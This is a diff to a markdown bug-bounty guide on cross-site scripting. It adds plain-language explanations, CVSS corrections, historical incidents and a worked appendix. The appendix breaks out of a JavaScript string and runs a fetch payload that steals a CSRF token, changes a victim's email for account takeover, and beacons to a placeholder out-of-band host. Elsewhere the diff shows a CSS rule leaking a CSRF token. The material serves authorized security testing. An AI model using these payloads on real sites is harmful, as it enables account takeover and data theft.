@@ -84,6 +84,7 @@
 - [Appendix A — XSS Workflow Cheat Sheet](#appendix-a--xss-workflow-cheat-sheet)
 - [Appendix B — Context Decision Tree](#appendix-b--context-decision-tree)
 - [Appendix C — Important Links](#appendix-c--important-links)
+- [Appendix D — Worked End-to-End Transcript (reflected → CSRF-token theft → ATO)](#appendix-d--worked-end-to-end-transcript-reflected-js-string-context--csrf-token-theft--account-takeover)
 
 ---
 
@@ -214,6 +215,8 @@ HTTPServer(("0.0.0.0", 8000), H).serve_forever()
 
 # 1.9 XSS Fundamentals — what's *actually* happening (read this first if you're learning)
 
+> 🔰 **In plain words — the anchor for this whole kit.** Think of the victim's **browser as an actor performing the web page like a script**. Most of the script is just **words to read aloud** (the visible text, your name, a comment) — but some parts are **stage directions the actor *acts on*** (`<script>…</script>`, `onclick="…"`, a `javascript:` link). **XSS is sneaking a stage direction into a spot meant for plain words**, so the actor *performs your line* instead of reading it aloud. And here's why it's game-over rather than a prank: the actor is performing **in the victim's show, wearing the victim's costume** — your line runs *inside* the website with the victim's logged-in identity, so it can read their session cookie, act as them, change their email, drain their account. That's the whole kit in one sentence: **get the victim's browser to run your script as if the website wrote it → then use the victim's identity to steal or do something.** Everything below — contexts, encoding, CSP, the escalation to account takeover — is just detail on *how to sneak the direction in* and *what to do once the actor performs it.* `alert(1)` only proves the actor performed your line; the money is in what you make it do next.
+
 > Skip if you're already fluent. If you want to be an expert, internalize this — every later trick is just a
 > consequence of these five facts. Each says **what it is**, **why it matters**, and the **rule** you'll reuse.
 
@@ -258,6 +261,8 @@ another — that mismatch is the bug.*
 
 # 2. XSS Taxonomy — Which Type Pays, and Why
 
+> **In plain words:** all XSS gets the actor to perform your line, but *who watches the show* and *when* is what sets the price. **Stored** = your stage direction is saved into the script itself, so it performs for **everyone who opens the page** — including admins — with no action on their part (0-click, mass, top dollar). **Reflected** = the direction only rides along in a link you send, so the victim has to **open your crafted URL** (1-click). **DOM-based** = the direction never even reaches the server — the page's *own* JavaScript picks it up from the URL and performs it (often sailing past server-side defenses). **Blind** = stored, but it performs on a stage you can't see (an admin/support panel) — which is exactly why it's valuable. **Self-XSS** = you can only make *yourself* perform it → not a bug alone. Memorize the ladder: stored > reflected > self; 0-click > 1-click; admin-context > user-context.
+
 | Type | Where the payload lives | Who triggers it | Typical bounty weight |
 |------|------------------------|-----------------|------------------------|
 | **Stored / Persistent** | Saved server-side, rendered later to others | **Other users / admins, 0-click** | ★★★★★ highest — mass, 0-click, often admin |
@@ -276,6 +281,8 @@ another — that mismatch is the bug.*
 ---
 
 # 3. The Source → Sink → Context Model
+
+> **In plain words:** every XSS is a three-part story — your input starts somewhere (**source**: a URL param, a form field, the `#` of the URL), travels to a spot where the page puts it on stage (**sink**: written into the HTML, handed to `innerHTML`, dropped in a `<script>`), and lands in a particular **context** (in plain body text? inside a quote? already inside JavaScript?). The context is the lock and your payload is the key: the *exact same* input is harmless plain text in one spot and a performed stage-direction in another. So the skill isn't memorizing payloads — it's **finding where your data lands and which characters survived the app's encoding**, then picking the one breakout that fits *that* spot.
 
 Every XSS is: **attacker-controlled data (source)** flows into an **execution point (sink)** rendered in a **context** that lets it run as code.
 
@@ -715,6 +722,8 @@ input[name="csrf"][value^="b"]{background:url(//YOUR.oast.fun/leak?c=b)}
 
 # 11. DOM-Based XSS — Source-to-Sink Tracing
 
+> **In plain words:** here the *website's own JavaScript* is the one that hands your line to the actor — the server never sees the payload at all. The page's script reads something you control (classically the part of the URL after `#`, which browsers never send to the server) and carelessly writes it straight into the page (`element.innerHTML = location.hash`). Because the server never touches it, **server-side WAFs and even CSP often don't apply** — which is exactly why DOM XSS is underhunted and worth your time. Your job shifts from "break out of the server's HTML" to "trace which source flows into which dangerous sink in the client code."
+
 The payload never appears in the server's HTML — a **client-side script** reads a source and writes it to a dangerous sink. Server-side WAFs and even CSP `script-src` can be irrelevant if the sink builds inline behavior. **Undervalued; hunt it.**
 
 ## 11.1 The model
@@ -1045,6 +1054,8 @@ A marker that reflects but whose payload gets a `403`/`406`/scrubbed means a **W
 
 # 19. CSP Analysis & Bypass (the big one)
 
+> **In plain words:** a **Content-Security-Policy is the theater's "only perform lines from these approved authors" rule.** Even if you sneak your stage direction in, a strict CSP can make the actor *refuse to perform it* (it won't run inline scripts or load scripts from your server) — which can knock your bug down to Info. So read the CSP **early**: if it's strict and actually blocks execution, say so; if it's loose or has a hole (allows `unsafe-inline`, trusts a domain you can upload to, has a JSONP endpoint, or a bypassable nonce), that gap is itself a finding and the path to making the actor perform anyway. Don't celebrate an injection until you've checked whether the CSP will let it run.
+
 Content-Security-Policy is the control most likely to **downgrade or block** your XSS. Read it early; a bypass is itself a finding, and a *blocking* CSP can cap your severity.
 
 ## 19.1 Read & score the policy
@@ -1191,6 +1202,8 @@ Your job in Phase 5 is to climb this ladder as high as the app allows and **demo
 
 # 24. Session & Cookie Theft
 
+> **In plain words:** the oldest cash-out — once the actor performs your line inside the victim's show, read their "session cookie" (the wristband that proves they're logged in) and send it to your own server; paste it into your browser and you're logged in *as them*. The one catch: it only works if the wristband **isn't marked `HttpOnly`** (that flag hides it from JavaScript). If it is HttpOnly, don't stop — you can't *read* the wristband, but your line still *acts as the victim* on the site (§26 forces actions with their identity, no cookie-reading needed). Always exfil your **own** test account's wristband, never a real user's.
+
 The classic. Viable **only if the session cookie lacks `HttpOnly`** (JS can read it). Check `document.cookie` in console.
 
 ```javascript
@@ -1222,6 +1235,8 @@ Full script: `poc/token_exfil.js`.
 ---
 
 # 26. CSRF-Token Theft → Forced Actions → 0-click ATO
+
+> **In plain words:** this is the escalation that beats `HttpOnly` and wins the highest payouts — and the key insight is you **never need to steal the wristband at all**. Your line is *already performing inside the victim's show*, so instead of reading their identity, just **act with it**: have your script grab the page's anti-CSRF token (it's right there in the DOM) and fire the "change my email" or "add a new password" request in the victim's own session. The site sees a perfectly normal, fully-authenticated request from the victim and obeys. Point that at a password-reset or email-change flow and it's a **0-click account takeover** — the victim just had to open the page. This works even when every cookie is HttpOnly and Secure, which is why it's the go-to escalation.
 
 When cookies are `HttpOnly` (can't steal them) and there's no readable token, you **don't need the cookie** — you're *already executing in the victim's origin*. Read the page's anti-CSRF token with JS and perform a **privileged state-changing request** in their session.
 
@@ -1435,6 +1450,8 @@ These destroy your credibility with a program. Each has a *narrow* condition und
 
 # 36. Severity Calibration — how triagers really rate XSS
 
+> **In plain words:** severity is decided by three dials from the anchor — **whose show** the actor performed in (admin > another user > only yourself), **how much the victim had to do** (0-click stored > 1-click reflected link > self), and **what you actually made the line *do*** (full account takeover > steal a session > a bare `alert`). A stored payload that fires 0-click in an admin's session and takes over accounts is the Critical jackpot; a reflected `alert` on a logged-out page is Low/Info. The gap between them isn't the injection — it's the *escalation you demonstrated*. Report the impact you proved, pick a CVSS vector you can defend, and never lead with `alert(1)`.
+
 Set a severity you can **defend** with a CVSS vector. "Alone" = the finding by itself; "Chained" = realistic uplift.
 
 | XSS scenario | Typical alone | Realistic chained | What moves it |
@@ -1453,8 +1470,8 @@ Set a severity you can **defend** with a CVSS vector. "Alone" = the finding by i
 | **`javascript:`/`data:` link XSS (1-click)** | **Medium** | High | Up with the ATO chain. |
 
 **CVSS pointers (v3.1):**
-- Reflected, 1-click, ATO: roughly `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` → High (often ~8.x). `S:C` (scope changed) is defensible because XSS in one origin affects the user's session/credentials.
-- Stored, 0-click, admin: `UI:N`, `PR:N`, `S:C`, `C:H/I:H` → Critical (~9.x).
+- Reflected, 1-click, ATO: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` — note this **exact vector computes to 9.3 (Critical)**, because `S:C` + full `C:H/I:H` is a strong combination. Many programs settle **~8.x High** for reflected-needs-a-click either by scoring the XSS's own integrity impact as `I:L` (→ 8.2) or by keeping scope unchanged `S:U` (→ 8.1). Pick one deliberately and be ready to defend it — don't print `S:C/C:H/I:H` and *call* it High. `S:C` (scope changed) is defensible because XSS in one origin affects the user's session/credentials.
+- Stored, 0-click, admin: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` → **Critical** (this exact vector caps at **10.0**; conservative `I:L` scoring lands ~9.6).
 - Anchor to **CWE-79** (or **CWE-80** specific; **CWE-116** for the encoding root cause). If you can't tell an attacker story, your severity is too high.
 
 ---
@@ -1635,6 +1652,20 @@ A SPA read `location.hash` into `innerHTML` client-side. The server WAF never sa
 
 > **Common thread:** in every case the payout came from the **escalation and the context**, not the injection. The injection was the *door*; the report was about what was **behind** it.
 
+## 42.1 Verified named incidents (the ones that made XSS history)
+
+> These are the public, documented cases — cite them in a report when you want to prove "a single reflection becomes a worm / mass-ATO / seven-figure fine." Each is sourced in Appendix C's research links.
+
+**1) The Samy worm — MySpace, 4 Oct 2005 (the canonical XSS worm).** Samy Kamkar (then 19) stored a JavaScript payload in his MySpace profile (the profile filter allowed script via a CSS/`div` breakout). Any *logged-in* viewer's browser silently ran it: it added Samy as a friend, appended "*but most of all, samy is my hero*" to the victim's profile, **and copied the payload into that profile** — so every visitor became a new carrier. It hit **~1,000,000 users in under 20 hours**, the fastest-spreading virus of its time, and MySpace had to take the site offline to purge it. It never stole a password — it just proved that *stored XSS self-propagates* through the session. **Class → §32–§33 (stored/admin/worm), §13 (blind stored).**
+
+**2) The Twitter "onMouseOver" worm — 21 Sept 2010 (attribute-context, zero click beyond a hover).** A tweet field reflected input into HTML without encoding, so an `onmouseover="…"` attribute could be smuggled into a message. Merely **moving the mouse over** the tweet executed JS that re-tweeted the payload to all your followers — a self-spreading worm that also popped third-party windows. Victims included Sarah Brown (wife of the former UK PM). Twitter told users to stay off the site and patched it the same day. **Lesson: an event-handler attribute (§7) needs no `<script>` and no click — "reflected + attribute context" is a full worm.**
+
+**3) The TweetDeck worm — 11 Jun 2014 (`<script>` rendered raw in a tweet).** A tweet containing a literal `<script class="xss">…</script>` with a `data-action` retweet call was rendered **unescaped** inside the TweetDeck client. Logging in ran the script, which auto-retweeted via TweetDeck's own retweet action — a self-propagating stored XSS that spread to **~82,000+ accounts** (one payload retweeted ~38,000 times in two minutes), hitting even BBC Breaking News. Twitter took TweetDeck **entirely offline** to stop it. **Lesson: a rich client that trusts server data is a stored-XSS sink (§12); the "submit view looked safe" trap (§42-B) is exactly this.**
+
+**4) DOMPurify mutation-XSS bypasses — Michał Bentkowski / cure53, 2019–2020 (CVE-2020-26870, DOMPurify < 2.0.17; a second class < 2.2.2).** Researchers repeatedly defeated the industry-standard HTML sanitizer with **mXSS**: a serialize→re-parse round-trip does *not* return the same DOM tree, and an element's namespace can flip **HTML→MathML/SVG** (nested `<form>`/`<mglyph>`/`<mtext>`), so a payload that DOMPurify deemed safe *mutated back into live script* after insertion. **Lesson: "it goes through DOMPurify" is not proof of safety — match the exact version against the bypass history (§20 mXSS, §16.4), because the sanitizer itself is a moving target.**
+
+**5) British Airways — 2018 (Magecart; attacker-controlled JS in a payment page → £20M fine).** Not a reflected-XSS *reflection*, but the purest demonstration of **what script execution in your origin is worth**: attackers injected ~22 lines of JavaScript into BA's payment flow, skimming card data from **~380,000 customers** to an attacker host while checkout appeared normal. The ICO's £183M intent was finalised at **£20M** (Oct 2020). **Lesson: whenever you can run JS in a page that handles credentials or payments, the ceiling is not "alert" — it's silent mass data theft. Frame your XSS report with this impact (§23 ladder, §36 severity).**
+
 ---
 
 # Appendix A — XSS Workflow Cheat Sheet
@@ -1739,6 +1770,89 @@ XSS Hunter Express (self-host blind XSS)  https://github.com/mandatoryprogrammer
 PentesterLab (hands-on XSS exercises)     https://pentesterlab.com/
 CWE-79 / CWE-80 / CWE-116                  https://cwe.mitre.org/
 ```
+
+---
+
+# Appendix D — Worked End-to-End Transcript (reflected JS-string context → CSRF-token theft → account takeover)
+
+> **Why this one:** the case studies (§42) tell the story; this shows the **bytes**. It walks the hardest common context — a reflection **inside a `<script>` string literal** — from first marker to a **HttpOnly-proof ATO** on your own two test accounts. This is the exact sequence that turns "reflected `alert`" into the Critical that pays. Replace `target.tld` / `oast.fun` with your authorized target + your OOB host. Every step is on accounts you own (§38).
+
+**Setup.** Two test accounts you control: **A** = attacker (`atk@you.tld`), **B** = victim (`vic@you.tld`). Burp between browser and target; an OOB listener (`https://YOURID.oast.fun`) you own.
+
+**Step 0 — Recon finds a candidate.** `gau`/`katana` surface `https://target.tld/search?q=hello`. The `q` value appears on the results page. Inject a unique marker (§5):
+
+```
+GET /search?q=xss7f3a9 HTTP/1.1
+Host: target.tld
+Cookie: session=<A's cookie>            ← authenticated dashboard
+```
+
+**Step 1 — Locate the marker + probe the context.** View Source of the response — the marker is **not** between tags; it's inside an inline script:
+
+```html
+...
+<script>
+  var lastQuery = "xss7f3a9";           ← reflection is INSIDE a JS string literal (§8)
+  renderResults(lastQuery);
+</script>
+```
+
+This is **JS string context**, not HTML body — `<svg onload>` would appear as inert text here. The breakout tool is the **quote + terminator**, not a tag. Probe which chars survive (§5.2):
+
+```
+GET /search?q=xss7f3a9"'</script> HTTP/1.1
+```
+
+Response shows:
+
+```html
+  var lastQuery = "xss7f3a9"'</script>";     ← the " came back RAW and unescaped
+```
+
+The double-quote is **not** encoded → we can close the string. (If `"` were `&quot;` we'd pivot to a `</script>`-tag breakout or another context.)
+
+**Step 2 — Confirm execution (minimal, benign).** Close the string, close the statement, run, and comment out the trailing junk so the script still parses (§8.1):
+
+```
+GET /search?q=";alert(document.domain)// HTTP/1.1
+```
+
+Rendered:
+
+```html
+  var lastQuery = "";alert(document.domain)//";
+  renderResults(lastQuery);
+```
+
+`alert(document.domain)` fires showing `target.tld` → **execution confirmed in the app origin**. (Prefer `document.domain` over `alert(1)` — it proves *which* origin, killing the "sandboxed/other-origin" false-positive, §35.)
+
+**Step 3 — Check what we can steal.** DevTools → the session cookie is `HttpOnly` (so `document.cookie` returns nothing useful) and there's no token in `localStorage`. **This is where most reports stop at "reflected XSS, High?" — don't.** The page is an *authenticated* dashboard, so our script runs **as B** and can read B's DOM, including the **CSRF token** in the account-settings form. HttpOnly protects the cookie's *confidentiality*, not the *actions the session can take* (§26).
+
+**Step 4 — Build the impact payload (email-change → password-reset ATO).** The account page (`/account`) has `<input name="csrf" value="…">` and posts an email change to `/account/email`. Our injected script, running in B's session, reads that token and drives the change to an inbox **A** controls:
+
+```js
+// delivered via the q= reflection; hosted minimal, benign, own-account only
+fetch('/account',{credentials:'include'})
+ .then(r=>r.text())
+ .then(h=>{
+   var t = new DOMParser().parseFromString(h,'text/html')
+             .querySelector('input[name=csrf]').value;      // read B's CSRF token
+   return fetch('/account/email',{method:'POST',credentials:'include',
+     headers:{'Content-Type':'application/x-www-form-urlencoded'},
+     body:'csrf='+encodeURIComponent(t)+'&email=atk%2Bpwn@you.tld'}); // change to A's inbox
+ })
+ .then(()=>fetch('https://YOURID.oast.fun/step4-email-changed'));  // OOB beacon = proof it ran
+```
+
+Minify to one line and place it in `q=` as `";<payload>//` (URL-encode). To make it **0-click on B**, deliver the link to B (your 2nd account) or — if the reflection is stored — plant it where B renders it (§12/§13).
+
+**Step 5 — Detonate as B.** In browser 2 (logged in as **B**), open the crafted `https://target.tld/search?q=%22%3B…%2F%2F`. The script runs in B's session: it reads B's CSRF token, POSTs the email change, and the OOB listener logs `GET /step4-email-changed` → **confirmed the action executed in the victim session**.
+
+**Step 6 — Complete the takeover.** B's recovery email is now `atk+pwn@you.tld` (A's inbox). As A, trigger **Forgot password** for B → the reset link lands in A's inbox → set a new password → **log in as B**. HttpOnly never mattered: the script acted *inside* B's session (§27).
+
+**Step 7 — Package the finding.** Title names the impact, not the symptom: *"Reflected XSS in `/search?q` (JS-string context) → CSRF-token theft → full account takeover (HttpOnly bypassed)."* Evidence = the 3 requests (probe, exec-confirm, impact), the OOB hit, and the before/after of B's email + the successful login-as-B. CWE-79 (+352 for the forced action, +384 if session-fixation was involved). Severity: **Critical** (ATO), CVSS ~9.0 (§36). Then **tear down the PoC page and restore B's email** (§38).
+
+> **The through-line:** every step chose the *context-correct* tool (quote-terminator, not a tag), refused to stop at `alert`, and used the **session itself** (not the cookie) as the weapon — which is why `HttpOnly` didn't save the account. That is the difference between a $150 "reflected XSS" and a $5,000 ATO.
 
 ---
 
